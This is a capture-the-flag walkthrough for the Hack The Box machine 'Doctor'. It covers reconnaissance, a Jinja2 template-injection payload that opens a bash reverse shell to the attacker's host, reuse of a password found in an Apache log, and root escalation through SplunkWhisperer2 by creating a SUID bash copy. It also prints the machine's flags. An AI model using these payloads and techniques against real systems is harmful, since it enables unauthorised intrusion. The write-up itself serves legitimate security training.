# Target
| Category          | Details                                                                                    |
|-------------------|--------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Doctor](https://app.hackthebox.com/machines/Doctor)                                       |  
| 🏷 **Type**       | HTB Machine                                                                                |
| 🖥 **OS**         | Linux                                                                                      |
| 🎯 **Difficulty** | Easy                                                                                       |
| 📁 **Tags**       | Python, SSTI, Splunk 8.0.5, [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 06:23 +0100
Nmap scan report for 10.129.2.21
Host is up (0.031s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
|_http-title: splunkd
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.43 seconds
```

#### Discover `doctors.htb` virtual host at main web page
![doctors.htb](images/doctors.png)

#### Add `doctors.htb` virtual host to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ echo "$TARGET doctors.htb" | sudo tee -a /etc/hosts
10.129.1.28 doctors.htb
```

#### Discover Python application running at `doctors.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ curl -I http://doctors.htb/
HTTP/1.1 302 FOUND
Date: Fri, 20 Feb 2026 20:40:26 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Content-Length: 237
Location: http://doctors.htb/login?next=%2F
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiaW5mbyIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.aZjGug.F6wCO26qbPKKlx3oSTop2dXuP_k; HttpOnly; Path=/
```

#### Enumerate `doctors.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ feroxbuster --url http://doctors.htb -w /usr/share/wordlists/dirb/big.txt -x php,html,js,png,jpg,py,txt,log -C 404        
<SNIP>
200      GET       95l      228w     4204c http://doctors.htb/login
302      GET        4l       24w      237c http://doctors.htb/ => http://doctors.htb/login?next=%2F
302      GET        4l       24w      251c http://doctors.htb/account => http://doctors.htb/login?next=%2Faccount
200      GET        6l        8w      101c http://doctors.htb/archive
302      GET        4l       24w      245c http://doctors.htb/home => http://doctors.htb/login?next=%2Fhome
200      GET      101l      238w     4493c http://doctors.htb/register
200      GET       80l      131w     1104c http://doctors.htb/static/main.css
200      GET       77l      187w     3493c http://doctors.htb/reset_password
302      GET        4l       24w      217c http://doctors.htb/logout => http://doctors.htb/home
<SNIP>
```
After enumerating `doctors.htb` application with web browser and `feroxbuster` we have found out that we have ability to register user and post messages with title and content. Since this is Python based web application we could try SSTI attack vector. Initial testing showed that message list and details page are not vulnerable. There is however `/archive` discovered by `feroxbuster`.

#### Register user and login
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ curl -s http://doctors.htb/register -d 'username=test&email=test@server.com&password=pass&confirm_password=pass&submit=Sign+Up' -o /dev/null && \
curl -s -L -c cookies.txt http://doctors.htb/login -d 'email=test@server.com&password=pass&submit=Login' -o /dev/null
```

#### Create message with `{{7*7}}` title and access `/archive` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ curl -s -b cookies.txt http://doctors.htb/post/new -d 'title={{7*7}}&content=Test&submit=Post' -o /dev/null
curl -b cookies.txt http://doctors.htb/archive

        <?xml version="1.0" encoding="UTF-8" ?>
        <rss version="2.0">
        <channel>
        <title>Archive</title>
        <item><title>49</title></item>
```
We can see that title of our message has been evaluated as 49, which proves SSTI vulnerability, which might lead to RCE.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection by exploiting SSTI in `/archive` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Doctor]
└─$ REVERSE_SHELL=$(echo -n "/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"" | jq -sRr @uri) && \
curl -s -b cookies.txt http://doctors.htb/post/new -d "title={{request.application.__globals__.__builtins__.__import__('os').popen('$REVERSE_SHELL').read()}}&content=Test&submit=Post" -o /dev/null && \
curl -b cookies.txt http://doctors.htb/archive
```

#### Confirm foothold gained
```
connect to [10.10.16.16] from (UNKNOWN) [10.129.1.28] 50424
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

#### Discover password in `/var/log/apache2/backup`
Password has been discovered with `linpeas`
```
web@doctor:~$ grep password /var/log/apache2/backup
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

#### Run shell as user `shaun` by reusing discovered password
```
web@doctor:~$ su shaun
Password: Guitar123
/usr/bin/script -qc /bin/bash /dev/null
shaun@doctor:/home/web$ id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
```

#### Capture user flag
```
shaun@doctor:~$ cat /home/shaun/user.txt
964a0e084cccda25496840111ef334ea
```

### Root flag

#### Discover `splunkd` running as `root` user
```
shaun@doctor:$ ps aux | grep splunk
root        1169  0.0  2.1 257468 86724 ?        Sl   20:44   0:03 splunkd -p 8089 start
root        1170  0.0  0.3  77664 13272 ?        Ss   20:44   0:00 [splunkd pid=1169] splunkd -p 8089 start [process-runner]
```

#### Reuse `shaun:Guitar123` credentials to access splunk
```
shaun@doctor:~$ curl -s https://127.0.0.1:8089/services/server/info -k -u 'shaun:Guitar123' | grep 'generator'
  <generator build="a1a6394cc5ae" version="8.0.5"/>
```

#### Use [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2) to spawn root shell
`PySplunkWhisperer2_local_python3.py` has been uploaded from attacker machine.
```
shaun@doctor:~$ python3 PySplunkWhisperer2_local_python3.py --username shaun --password Guitar123 --payload '/bin/cp /bin/bash /tmp/root_shell && /bin/chmod 4755 /tmp/root_shell'
</tmp/root_shell && /bin/chmod 4755 /tmp/root_shell'
Running in local mode (Local Privilege Escalation)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpv4mda4rt.tar
[.] Installing app from: /tmp/tmpv4mda4rt.tar
[+] App installed, your code should be running now!

Press RETURN to cleanup


[.] Removing app...
[+] App removed

Press RETURN to exit


Bye!
```

#### Use root shell to escalate to `root` user
```
shaun@doctor:~$ /tmp/root_shell -p
/tmp/root_shell -p
root_shell-5.0# id
uid=1002(shaun) gid=1002(shaun) euid=0(root) groups=1002(shaun)
```

#### Capture root flag
```
root_shell-5.0# cat /root/root.txt
ccf0931186d5708aaf9bbe39737708e3
```
